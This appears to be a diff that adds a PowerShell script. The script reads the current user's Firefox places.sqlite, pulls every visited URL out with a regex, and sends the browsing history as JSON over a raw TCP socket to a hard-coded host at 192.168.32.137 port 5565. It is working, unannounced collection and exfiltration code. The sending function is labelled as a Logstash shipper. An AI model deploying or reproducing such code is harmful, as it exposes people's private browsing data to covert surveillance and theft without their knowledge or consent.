@@ -1,0 +1,43 @@
+Function Send-JsonOverTcp { 
+ param ( [ValidateNotNullOrEmpty()] 
+ [string] $LogstashServer, 
+ [int] $Port, 
+ $JsonObject) 
+ $JsonString = $JsonObject -replace "`n",' ' -replace "`r",' ' -replace ' ',''
+ $Ip = [System.Net.Dns]::GetHostAddresses($LogstashServer) 
+ $Address = [System.Net.IPAddress]::Parse($Ip) 
+ $Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
+ $Stream = $Socket.GetStream() 
+ $Writer = New-Object System.IO.StreamWriter($Stream)
+ $Writer.WriteLine($JsonString)
+ $Writer.Flush()
+ $Stream.Close()
+ $Socket.Close()
+}
+
+$Brow = '['
+$Username = whoami | Split-Path -Leaf
+$Path = "$Env:systemdrive\Users\$Username\AppData\Roaming\Mozilla\Firefox\Profiles\"
+       if (-not (Test-Path -Path $Path)) {
+            Write-Verbose "[!] Could not find FireFox History for username: $UserName"
+        } else {
+            $Profiles = Get-ChildItem -Path "$Path\*.default*\" -ErrorAction SilentlyContinue
+            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
+            $Value.Value |ForEach-Object {
+                if ($_ -match $Search) {  
+                   ForEach-Object {
+                     $Brow += New-Object -TypeName PSObject -Property @{
+                        User = $UserName
+                        Browser = 'Firefox'
+                        DataType = 'History'
+                        Data = $_
+                        } | ConvertTo-Json
+                    }
+                }
+            }
+        }
+
+$FirefoxBrowserHistory = $Brow -replace '}','},' -replace '},$','}'
+$FirefoxBrowserHistory += ']'
+Send-JsonOverTcp 192.168.32.137 5565 "$FirefoxBrowserHistory"
